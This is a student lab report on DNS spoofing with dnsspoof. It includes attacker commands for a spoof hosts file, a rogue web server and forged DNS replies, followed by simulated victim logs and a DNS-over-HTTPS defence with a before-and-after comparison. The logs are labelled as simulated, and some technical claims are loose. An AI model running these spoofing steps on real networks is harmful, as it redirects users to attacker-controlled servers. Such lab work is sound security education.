# DNS Spoofing Lab with Custom Redirect & Defence
## Lab 4, Project 3
### Instructor: Ishrat Jabeen

---

## Table of Contents
1. [Network Topology](#1-network-topology)
2. [Simulated Attack Logs](#2-simulated-attack-logs)
3. [Simulated Victim Logs](#3-simulated-victim-logs)
4. [Defence Implementation](#4-defence-implementation)
5. [Comparison Report: Before Defence vs After Defence](#5-comparison-report-before-defence-vs-after-defence)

---

## 1. Network Topology

```
           [ INTERNET ]
                |
          [ WAN Router ] (Gateway: 192.168.1.1)
                |
         -------+-----------------------
         |                             |
    [ Attacker ]                  [ Victim ]
    192.168.1.50                  192.168.1.10
    (Kali Linux)                  (Windows/Workstation)
    - dnsspoof                    - Browser with DoH
    - HTTP Server                 - Target: test.local
```

**Network Configuration Summary:**

| Machine    | IP Address    | OS              | Role                      |
|------------|---------------|-----------------|---------------------------|
| Attacker   | 192.168.1.50  | Kali Linux      | DNS Spoofing, Web Hosting |
| Victim     | 192.168.1.10  | Windows 10      | Target Workstation        |
| Gateway    | 192.168.1.1   | Router Firmware | Network Gateway           |

---

## 2. Simulated Attack Logs

### Attacker Machine: 192.168.1.50 (Kali Linux)

#### Step 1: Create the DNS Spoofing Table

```bash
attacker@kali:~$ echo "192.168.1.50  test.local" > spoof_hosts.txt
attacker@kali:~$ cat spoof_hosts.txt
192.168.1.50  test.local
```

#### Step 2: Create and Host a Custom Malicious Webpage

```bash
attacker@kali:~$ mkdir web_root && cd web_root
attacker@kali:~/web_root$ echo "<html>
<head><title>Spoofed Site</title></head>
<body>
<h1>WARNING: Security Lab - Simulated Site</h1>
<p>You have been redirected to the attacker's server.</p>
</body>
</html>" > index.html

attacker@kali:~/web_root$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

#### Step 3: Execute DNS Spoofing Attack

```bash
attacker@kali:~$ sudo dnsspoof -i eth0 -f spoof_hosts.txt
dnsspoof: listening on eth0 [udp dst port 53 and not src 192.168.1.50]
192.168.1.10.53421 > 8.8.8.8.53: [udp size 512] A? test.local
192.168.1.10.53421 > 8.8.8.8.53: test.local A 192.168.1.50
192.168.1.10.53422 > 8.8.8.8.53: [udp size 512] A? test.local
192.168.1.10.53422 > 8.8.8.8.53: test.local A 192.168.1.50
```

#### HTTP Server Access Log (Confirming Victim Connection)

```bash
192.168.1.10 - - [25/Mar/2026 14:32:01] "GET / HTTP/1.1" 200 -
192.168.1.10 - - [25/Mar/2026 14:32:01] "GET /favicon.ico HTTP/1.1" 404 -
```

---

## 3. Simulated Victim Logs

### Victim Machine: 192.168.1.10 (Windows Workstation)

#### DNS Resolution Test (Before Defence)

```cmd
C:\Users\victim> ping test.local

Pinging test.local [192.168.1.50] with 32 bytes of data:
Reply from 192.168.1.50: bytes=32 time<1ms TTL=64
Reply from 192.168.1.50: bytes=32 time<1ms TTL=64
Reply from 192.168.1.50: bytes=32 time<1ms TTL=64
Reply from 192.168.1.50: bytes=32 time<1ms TTL=64

Ping statistics for 192.168.1.50:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```

#### Browser Network Console Log (Before Defence)

```
[Network Tab - Developer Tools]

Request URL: http://test.local/
Request Method: GET
Status Code: 200 OK
Remote Address: 192.168.1.50:80
Referrer Policy: strict-origin-when-cross-origin

Response Headers:
    Content-Type: text/html
    Server: SimpleHTTP/0.6 Python/3.11.2
    Date: Wed, 25 Mar 2026 14:32:01 GMT
```

**Observation:** The victim successfully connected to the attacker's server at `192.168.1.50` instead of the legitimate destination. The DNS spoofing attack was successful.

---

## 4. Defence Implementation

### Objective
Configure DNS-over-HTTPS (DoH) on the victim's browser to encrypt DNS queries and bypass local network spoofing.

### 4.1 Defence Implementation in Google Chrome

1. Open Chrome and navigate to:
   ```
   Settings > Privacy and Security > Security
   ```

2. Scroll to the **Advanced** section.

3. Locate **"Use secure DNS"** and toggle it to **ON**.

4. Select **"With: Cloudflare (1.1.1.1)"** or **"Google (Public DNS)"** from the dropdown menu.

5. Restart the browser to apply changes.

### 4.2 Defence Implementation in Mozilla Firefox

1. Open Firefox and navigate to:
   ```
   Settings > General > Network Settings > Settings...
   ```

2. Scroll to the bottom of the Connection Settings dialog.

3. Check the box for **"Enable DNS over HTTPS"**.

4. Select a provider:
   - Cloudflare: `https://mozilla.cloudflare-dns.com/dns-query`
   - Google: `https://dns.google/dns-query`

5. Click **OK** and restart Firefox.

### 4.3 Verification

To verify DoH is active, visit the following URL in the browser:

```
https://1.1.1.1/help
```

**Expected Result:**
| Check                      | Status |
|----------------------------|--------|
| Connected to 1.1.1.1       | Yes    |
| Using DNS over HTTPS (DoH) | Yes    |
| Using DNS over TLS (DoT)   | No     |

---

## 5. Comparison Report: Before Defence vs After Defence

### Executive Summary

This report analyzes the efficacy of DNS-over-HTTPS (DoH) in mitigating local-area network (LAN) DNS spoofing attacks. In the "Before" scenario, the network relied on traditional plaintext DNS (UDP Port 53). In the "After" scenario, cryptographic encapsulation via HTTPS (TCP Port 443) was implemented at the application layer.

### Technical Analysis: Before Defence

During the initial phase of the lab exercise, the Attacker machine utilized the `dnsspoof` tool from the dsniff package to monitor the local network segment for DNS queries. Because standard DNS queries are transmitted as unencrypted UDP packets and lack any form of authentication or integrity verification, the attacker was able to perform a classic "race condition" attack.

The attack methodology proceeded as follows: when the Victim machine initiated a DNS query for `test.local`, the request was broadcast on the local network toward the configured upstream DNS resolver (8.8.8.8). The Attacker, having positioned itself on the same network segment and running in promiscuous mode, observed this query in real-time. The `dnsspoof` tool then injected a forged DNS response packet with the spoofed answer (`192.168.1.50`) before the legitimate response could arrive from the upstream resolver.

The Victim machine, lacking any mechanism to verify the authenticity or integrity of DNS responses, accepted the first response it received. Consequently, the operating system cached the malicious mapping, and all subsequent connection attempts to `test.local` were directed to the attacker's web server at `192.168.1.50`. The victim's browser loaded the attacker's custom webpage, demonstrating complete compromise of the name resolution process.

### Technical Analysis: After Defence

Upon enabling DNS-over-HTTPS in the browser settings, the Victim machine fundamentally altered its DNS resolution behavior. Instead of broadcasting plaintext UDP queries to the local network's default gateway, the browser established an encrypted TLS 1.3 tunnel directly to a trusted remote resolver (Cloudflare's 1.1.1.1 service).

When the user subsequently attempted to resolve `test.local`, the query was encapsulated within an HTTPS POST request to `https://cloudflare-dns.com/dns-query`. This request traveled over TCP port 443, encrypted with the same cryptographic protections used for secure web browsing.

### Why the Defence Was Effective

The DNS spoofing attack failed after implementing DoH due to three fundamental technical factors:

1. **Encryption:** The attacker could no longer observe the content of DNS requests because the domain name being queried was encrypted within the TLS payload. Network packet capture showed only encrypted HTTPS traffic to Cloudflare's servers, revealing no actionable intelligence about the victim's browsing intentions.

2. **Integrity Protection:** TLS provides cryptographic message authentication through HMAC verification. Even if the attacker attempted to inject malicious data into the TCP stream, the modifications would be detected due to MAC failures, causing the connection to be terminated rather than accepting tampered data.

3. **Trust Boundary Relocation:** DoH effectively bypasses the local router's DNS configuration entirely, moving the trust boundary from the untrusted LAN environment to a known, authenticated secure endpoint. The `dnsspoof` tool reported zero pattern matches because no plaintext DNS traffic traversed the network. The Victim machine successfully resolved domains through the encrypted channel, completely immune to local-network manipulation.

### Comparative Results Table

| Metric                        | Before Defence        | After Defence              |
|-------------------------------|-----------------------|----------------------------|
| DNS Protocol                  | UDP (Plaintext)       | HTTPS (Encrypted)          |
| Port Used                     | 53                    | 443                        |
| Attacker Visibility           | Full query content    | Encrypted traffic only     |
| Spoofing Success              | Yes                   | No                         |
| Resolution of test.local      | 192.168.1.50 (Spoofed)| NXDOMAIN or Legitimate IP  |
| Data Integrity                | None                  | TLS MAC verification       |

### Conclusion

The implementation of DNS-over-HTTPS represents an effective application-layer defence against local network DNS spoofing attacks. By encrypting queries and authenticating responses through TLS, DoH eliminates the attacker's ability to observe, intercept, or modify DNS traffic. Organizations and individual users should consider enabling DoH as a baseline security measure, particularly when operating on untrusted network segments such as public Wi-Fi or shared corporate networks.

---

## References

1. RFC 8484 - DNS Queries over HTTPS (DoH)
2. Cloudflare DNS Documentation - https://developers.cloudflare.com/1.1.1.1/
3. Mozilla Firefox DoH Implementation Guide
4. OWASP DNS Spoofing Prevention Guidelines

---

*Document prepared for Lab 4, Project 3*
*Date: March 25, 2026*
